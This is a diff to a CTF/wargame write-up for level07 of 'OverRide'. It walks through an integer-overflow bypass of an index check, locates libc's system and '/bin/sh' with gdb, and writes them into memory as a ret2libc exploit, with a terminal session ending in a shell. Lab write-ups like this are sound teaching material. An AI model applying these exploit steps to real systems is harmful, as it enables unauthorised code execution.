@@ -116,24 +116,64 @@ Since there is protection that prevents us from storing at an index where the mo
 we can't overwrite the address by using the index 114, because `114 % 3 == 0`
 
 So we will do an overflow:
-To counter the \* 4 we do a
-UINT_MAX / 4 : 4294967295 /4 ~~ 1073741824
+To counter the \* 4 we divide UINT_MAX / 4
+UINT_MAX / 4 : `4294967295 /4 = 1073741823.75`
+Since it is a decimal number we round it up to the next whole number : `1073741824`
 
-1073741824 + 114
-1073741938
+`1073741824 * 4` after overflow is equal to 0
+
+Now we add 114 to our number `1073741824 + 114 = 1073741938`,
+we check that it's modulo 3 is not equal to 0 : `1073741938 % 3 = 1`
 
 Since the program `memset` the environment at the start of the program,
 we can not put a shellcode in the environment
 
 So we have to use a Ret2libc
 
-System
+Address of `system`
+
+```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-4159090384
+```
 
-==
+Converted in decimal : `4159090384`
+
+Address of `"/bin/sh"`
+
+```
 (gdb) find 0xf7e2c000,0xf7fcbfff, "/bin/sh"
 0xf7f897ec
 1 pattern found.
-4160264172
+```
+
+Converted in decimal : `4160264172`
+
+Now we have just have to put the number `4159090384` at the index `1073741938`,
+and the number `4160264172` at the index `114 + 2` because a ret2libc attack consists of 3 addresses
+and we want to write the third addresses. Since the modulo 3 of 116 is not equal to 0 we can just use 116
+
+```Shell
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$
+```
